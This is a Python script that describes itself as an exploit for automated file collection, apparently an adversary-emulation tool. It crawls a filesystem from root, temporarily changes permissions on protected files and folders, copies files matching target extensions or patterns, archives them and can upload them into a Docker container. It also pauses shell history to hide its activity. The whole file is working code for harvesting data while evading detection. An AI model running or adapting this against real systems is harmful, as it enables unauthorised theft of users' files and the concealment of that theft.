import argparse
import os
import stat
import logging
import hashlib
import re
import subprocess
from sys import platform
import tarfile
from datetime import datetime
from shutil import copyfile, rmtree

TARGET_EXTENSIONS = []
TARGET_REGEX_PATTERNS = []
MATCH_IGNORE_CASE = False
MD5 = hashlib.md5()

OWNER_RWX_PERMISSIONS = stat.S_IRWXU
OWNER_READ_PERMISSIONS = stat.S_IRUSR
OWNER_READ_EXECUTE_PERMISSIONS = stat.S_IRUSR | stat.S_IXUSR
OWNER_WRITE_EXECUTE_PERMISSIONS = stat.S_IWUSR | stat.S_IXUSR

logger = logging.getLogger(__name__)
handler = logging.StreamHandler()
formatter = logging.Formatter(
    '%(asctime)s %(levelname)4s %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)


def execute_automated_collection(src, dest, archive, archive_name, upload, container, clean_dest):
    """
    PRE-CONDITIONS: [Operating System = "Linux/MacOS", Installed Software = "Python 3, Docker (optional)"]
        Assumes user has root access

    POST- CONDITIONS: If clean_dest is False, there should be a folder with a copy of all the matched files in dest.
    If clean_dest is True, there will be no persisted changes to the existing filesystem.


    This exploit traverses recursively through the src directory and copies any files that match at least one pattern in
    TARGET_REGEX_PATTERNS or with an extension listed in TARGET_EXTENSIONS. Files are copied into the dest directory.
    If archive is True, a tarball will be created with the name archive_name in the dest directory. If clean_dest is
    True, all collected documents will be deleted at the end of the script.

     If upload is True a container name must be provided. The script will upload the tarball or the files
     (if tarball not generated) to the container

    :param src: Path to directory to traverse
    :param dest: Path of directory to save files in
    :param archive: If True, dest will be tarballed
    :param archive_name: The name of the tarball
    :param upload: If True, files will be uploaded to docker container. Only the tarball will be uploaded if archived.
    :param container: The name of the container to copy files to
    :param clean_dest: If True, deletes all collected files at the end of the script
    """

    if not validate_pre_conditions():
        logger.error("Pre-conditions not met")
        return
    logger.info("Pre-conditions validated")

    pause_bash_history_command = "set +o history"
    run_bash_command_split(pause_bash_history_command)

    create_and_validate_permissions(dest)
    find_target_files(src, dest)

    tar_file = ''
    if archive:
        tar_file = os.path.join(dest, archive_name)
        archive_files(dest, tar_file)

    if upload:
        if tar_file != '':
            logger.info("Uploading tarball to docker container")
            upload_collections(container, tar_file)
        else:
            logger.info("Uploading files to docker container")
            upload_collections(container, dest)

    if clean_dest:
        clean_files(dest)

    resume_bash_history_command = "set -o history"
    run_bash_command_split(resume_bash_history_command)

    if not validate_post_condtiions(clean_dest, dest):
        logger.error("Post-conditions not met")
    else:
        logger.info("Post-conditions validated")


def run_bash_command_split(command):
    run_bash_command(command.split())


def run_bash_command(command):
    """
    Executes a bash command using subprocess
    :param command:
    :return:
    """
    process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL)
    process.communicate()


def find_target_files(src, dest):
    """
    Walks through the src directory copying files to dest. Uses TARGET_EXTENSIONS and TARGET_REGEX_PATTERNS to match
    files. Permissions are temporarily modified to ensure files can be copied. Restoration of permissions leaves
    system as close as possible to initial state
    :param src: The directory to traverse
    :param dest: The directory to copy files to
    """
    for root, dirs, files in os.walk(src):
        for directory in dirs:
            try:
                d = os.path.join(root, directory)
                original_permissions = get_permissions(d)
                if original_permissions < OWNER_READ_EXECUTE_PERMISSIONS:
                    logger.info(
                        "File does not have owner read execute permissions. Permissions will be temporarily modified."
                        " File: %s, current permissions: %d",
                        d,
                        original_permissions)

                    modify_permissions(d, OWNER_READ_EXECUTE_PERMISSIONS)
                    find_target_files(d, dest)
                    modify_permissions(d, original_permissions)
            except Exception as e:
                logger.error(e)
                continue
        for file in files:
            try:
                f = os.path.join(root, file)
                if file_matches_target_extension(file) or file_matches_target_regex_patterns(file):
                    logger.info("Target file found: %s", f)
                    original_permissions = get_permissions(f)
                    if original_permissions < OWNER_READ_PERMISSIONS:
                        logger.info(
                            "File does not have owner read permissions. Permissions will be temporarily modified. "
                            "File: %s, current permissions: %d", f, original_permissions)
                        modify_permissions(f, OWNER_READ_PERMISSIONS)
                    MD5.update(str(datetime.now()).encode("utf-8"))
                    name, ext = os.path.splitext(file)
                    unique_filename = ''.join([name, '-', MD5.hexdigest(), ext])
                    logger.info("Copying file %s to %s", f, os.path.join(dest, unique_filename))
                    copyfile(f, os.path.join(dest, unique_filename))
            except Exception as e:
                logger.error(e)
                continue


def validate_pre_conditions():
    if platform == "linux" or platform == "linux2" or platform == "darwin":
        return True
    return False


def validate_post_condtiions(clean_dest, dest):
    return clean_dest != os.path.exists(dest)


def file_matches_target_extension(f):
    """
    Checks if an extension is in the TARGET_EXTENSIONS list. If MATCH_IGNORE_CASE is True, the match
    will be case insensitive.
    :param f: A file name with extension (i.e. 'myfile.txt')
    :return: True if the file's extension is in TARGET_EXTENSIONS, False otherwise
    """
    ext = os.path.splitext(f)[1]
    return ext.lower() in TARGET_EXTENSIONS if MATCH_IGNORE_CASE else ext in TARGET_EXTENSIONS


def file_matches_target_regex_patterns(f):
    """
    Checks to see if a file name matches a regex pattern listed in TARGET_REGEX_PATTERNS
    :param f: A file name
    :return: True if at least one pattern in the list is matched, False otherwise
    """
    return True in [p.match(f) is not None for p in TARGET_REGEX_PATTERNS]


def create_and_validate_permissions(d):
    """
    Creates a directory if it doesn't exist and provides RWX permissions to the owner
    :param d: A path to a directory
    """
    if not os.path.exists(d):
        os.makedirs(d)
    modify_permissions(d, OWNER_RWX_PERMISSIONS)


def get_permissions(f):
    """
    Returns the 3-digit integer representation of a file's permissions
    :param f: A path to a file or directory
    :return: 3-digit integer
    """
    return int(oct(os.stat(f)[stat.ST_MODE])[-3:])


def modify_permissions(f, perm):
    """
    Modifies a file's permissions to perm
    :param f: A path to a file or directory
    :param perm: The 3-digit representation of a file's permissions
    """
    os.chmod(f, perm)


def archive_files(src, dest):
    """
    Archives the file by packing it into a tarball
    :param src: Path to directory to compress
    :param dest: Path of file to output
    """
    with tarfile.open(dest, "w:gz") as tar:
        tar.add(src, arcname=os.path.basename(src))


def upload_collections(container, src):
    logger.info('docker cp {} {}:{}'.format(src, container, '/'))
    docker_upload_command = 'docker cp {} {}:{}'.format(src, container, '/')
    run_bash_command(docker_upload_command)


def clean_files(dest):
    """
    Removes all files recursively in dest
    :param dest: Path to directory or files to remove
    """
    rmtree(dest)


def parse_bool_arg(arg):
    if arg.lower() in ('yes', 'y', 'true', 't', '1'):
        return True
    elif arg.lower() in ('no', 'n', 'false', 'f', '0'):
        return False


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Automated Collection.')
    parser.add_argument('--src', type=str, default='/', help='An absolute path to the directory to begin traversing in')
    parser.add_argument('--dest', type=str, default='/collect', help='An absolute path to the directory files will '
                                                                     'be collected in')
    parser.add_argument('--target_extensions', default=[], nargs='*',
                        help='A list of one or more extensions of files to collect')
    parser.add_argument('--target_regex', default=[], nargs='*',
                        help='A list of one or more regex patterns. Files matching any of '
                             'these patterns will be collected')
    parser.add_argument('--archive', type=parse_bool_arg, default=True,
                        help='Creates a tar ball after all the files have been '
                             'collected')
    parser.add_argument('--archive_name', type=str, default='collection.tar.gz', help='The name of the archive if '
                                                                                      'created')
    parser.add_argument('--upload', type=parse_bool_arg, default=False,
                        help='Uploads collection to a docker container from the host system. The container must '
                             'already be running.'
                             'A container name must be provided with '
                             'the --container_name argument')
    parser.add_argument('--container_name', type=str, help='The name of the docker container to upload files to')
    parser.add_argument('--clean_dest', type=parse_bool_arg, default=False,
                        help='Removes all files saved to the collection')
    args = parser.parse_args()
    TARGET_EXTENSIONS = args.target_extensions
    TARGET_REGEX_PATTERNS = [re.compile(p) for p in args.target_regex]
    if len(TARGET_EXTENSIONS) == len(TARGET_REGEX_PATTERNS) == 0:
        print("At least one extension or regex pattern must be provided")
    else:
        execute_automated_collection(args.src, args.dest, args.archive, args.archive_name, args.upload,
                                     args.container_name, args.clean_dest)
